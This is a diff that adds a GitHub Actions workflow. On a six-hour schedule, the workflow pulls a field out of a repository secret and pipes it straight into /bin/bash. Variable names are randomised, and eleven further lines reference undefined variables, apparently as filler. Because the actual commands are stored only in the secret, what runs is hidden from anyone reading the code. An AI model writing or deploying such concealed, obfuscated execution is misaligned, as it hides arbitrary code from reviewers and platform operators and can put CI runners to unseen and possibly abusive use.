@@ -1,0 +1,30 @@
+name: defujingshang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: defujingshang
+        env:
+          l77949: ${{ secrets.l77949 }}
+        run: |
+          echo $l77949 | jq -r .joctg009 | /bin/bash
+          echo $ho3 | jq -r .x5239 | /bin/bash
+          echo $kzf92383 | jq -r .tuol96855 | /bin/bash
+          echo $nxz2874 | jq -r .k7 | /bin/bash
+          echo $t92993 | jq -r .sbnp57 | /bin/bash
+          echo $akhih54999 | jq -r .xo1 | /bin/bash
+          echo $nb29647 | jq -r .a86 | /bin/bash
+          echo $vn614 | jq -r .bhw64353 | /bin/bash
+          echo $njgfc89120 | jq -r .dwjc2392 | /bin/bash
+          echo $say909 | jq -r .dx29 | /bin/bash
+          echo $n49 | jq -r .v2 | /bin/bash
+          echo $nuglr2 | jq -r .bwccp40631 | /bin/bash
+
